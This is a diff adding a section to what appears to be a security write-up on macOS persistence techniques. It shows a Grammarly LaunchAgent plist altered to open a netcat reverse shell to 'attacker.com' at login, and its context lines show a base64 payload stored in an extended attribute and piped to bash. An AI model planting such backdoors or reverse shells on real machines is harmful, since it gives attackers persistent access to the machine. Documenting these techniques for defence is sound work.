@@ -329,3 +329,57 @@ user.hiddenPayload
 ❯ xattr -p user.hiddenPayload not_malicious.txt | base64 -d | bash
 I'm on your system
 ```
+
+### LaunchAgent Backdoors
+
+LaunchAgent plists are a common target because they provide persistent access that survives reboots. Take this Grammarly helper, for example:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>AssociatedBundleIdentifiers</key>
+	<string>com.grammarly.ProjectLlama</string>
+	<key>EnvironmentVariables</key>
+	<dict>
+		<key>GD_AGENT_LABEL</key>
+		<string>com.grammarly.ProjectLlama.Shepherd</string>
+		<key>GD_AGENT_PLIST_PATH</key>
+		<string>/Users/rosesecurity/Library/LaunchAgents/com.grammarly.ProjectLlama.Shepherd.plist</string>
+		<key>GD_BUNDLE_ID</key>
+		<string>com.grammarly.ProjectLlama</string>
+		<key>GD_BUNDLE_NAME</key>
+		<string>Grammarly Desktop</string>
+	</dict>
+	<key>KeepAlive</key>
+	<true/>
+	<key>Label</key>
+	<string>com.grammarly.ProjectLlama.Shepherd</string>
+	<key>MachServices</key>
+	<dict>
+		<key>com.grammarly.nativemessaging.discovery</key>
+		<true/>
+	</dict>
+	<key>ProgramArguments</key>
+	<array>
+		<string>/Applications/Grammarly Desktop.app/Contents/Library/LaunchAgents/Grammarly Desktop Helper.app/Contents/MacOS/Grammarly Desktop Helper</string>
+	</array>
+	<key>RunAtLoad</key>
+	<true/>
+</dict>
+</plist>
+```
+
+We could modify the `ProgramArguments` array to execute malicious commands instead of or alongside the legitimate Grammarly helper:
+
+```xml
+<key>ProgramArguments</key>
+<array>
+    <string>/bin/bash</string>
+    <string>-c</string>
+    <string>nc -e /bin/bash attacker.com 4444 &amp;&amp; /Applications/Grammarly Desktop.app/Contents/Library/LaunchAgents/Grammarly Desktop Helper.app/Contents/MacOS/Grammarly Desktop Helper</string>
+</array>
+```
+
+The `RunAtLoad` and `KeepAlive` keys make this particularly dangerous because the malicious payload would execute automatically at login and restart if it crashes. The `MachServices` configuration also provides inter-process communication capabilities that could be exploited.
